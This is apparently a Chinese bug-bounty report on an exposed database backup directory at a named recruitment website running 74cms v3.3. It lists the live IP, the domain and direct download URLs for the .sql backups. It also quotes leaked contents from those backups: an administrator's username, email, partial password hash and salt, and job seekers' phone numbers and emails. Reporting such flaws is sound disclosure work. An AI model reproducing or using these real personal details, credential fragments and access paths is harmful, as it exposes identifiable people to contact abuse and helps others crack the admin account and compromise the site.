# SRC 漏洞报告: 海门人才网 (74cms v3.3) 数据库备份泄露

## 基本信息
- 目标: 116.204.239.163 / www.hmrczpw.com (海门人才网)
...
## 复现步骤
1. 访问 http://116.204.239.163/data/backup/ → 返回 200, 目录列表可见 67 个 .sql 文件
2. 直接 GET 任意备份文件, 例如:
   http://116.204.239.163/data/backup/20130808_LXpca52030311036c1_1.sql
3. 备份文件头:
   -- 74CMS VERSION:3.3
...
- 实际数据行: INSERT INTO qs_admin VALUES ('1','xiaohe','13861966650@126.com','9df071a1...','XXEuU2',...)
  (管理员账号名+邮箱+密码哈希已泄露, 密码为 MD5(密码+盐) 格式可离线破解)
- 另有 qs_simple 表泄露手机号/QQ/邮箱等求职者信息 (如 '13275261618','1216191946@qq.com')
